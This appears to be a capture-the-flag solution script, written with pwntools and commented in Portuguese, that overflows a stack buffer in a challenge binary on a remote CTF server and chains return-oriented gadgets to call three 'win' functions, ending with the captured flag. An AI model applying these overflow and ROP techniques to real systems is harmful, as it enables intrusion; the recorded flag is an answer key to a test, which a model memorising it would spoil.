# 64 bits in my Ark and Texture
# Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation.

from pwn import *

elf = context.binary = ELF("./64bits")
#p = process()
p = remote("connect.umbccd.net", 22237)

#gdb.attach(p)
#input("PAUSE: ")

# Respondendo as questões.
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"4")

# Retornando para a win1.
payload = b"A" * 0x98 + p64(0x401400) + p64(elf.sym["win1"])
p.recvuntil(b"address")
p.sendlineafter(b"\n", payload)

# Recuperando a flag1.
p.recvuntil(b"advance.")
flag1 = p.recvuntil(b"Continue", drop=True).decode()
print(flag1)

# Retornando para a win2.
payload = b"A" * 0x28 + p64(elf.sym["pop_rdi_ret"]) + p64(0xdeadbeef) + p64(0x401400) + p64(elf.sym["win2"])
p.sendline(payload)

# Recuperando a DEADBEEF
p.recvuntil(b"I believe in you")
deadbeef = p.recvuntil(b"Final ", drop=True).decode()
print(deadbeef)

# Retornnando para a win3
payload = b"A" * 0x38 + p64(elf.sym["pop_rdi_ret"]) + p64(0xdeadbeef) + p64(elf.sym["pop_rsi_ret"]) + p64(0xdeafface) + p64(elf.sym["pop_rdx_ret"]) + p64(0xfeedcafe) + p64(0x401400) +p64(elf.sym["win3"])
p.sendline(payload) 

# Recuperando o resto.
p.recvuntil(b"reward\n")
rest = p.recvall().decode()
print(rest)

#input("PAUSE: ")
# DawgCTF{C0ngR4tul4t10ns_d15c1p13_y0u_4r3_r34dy_2_pwn!}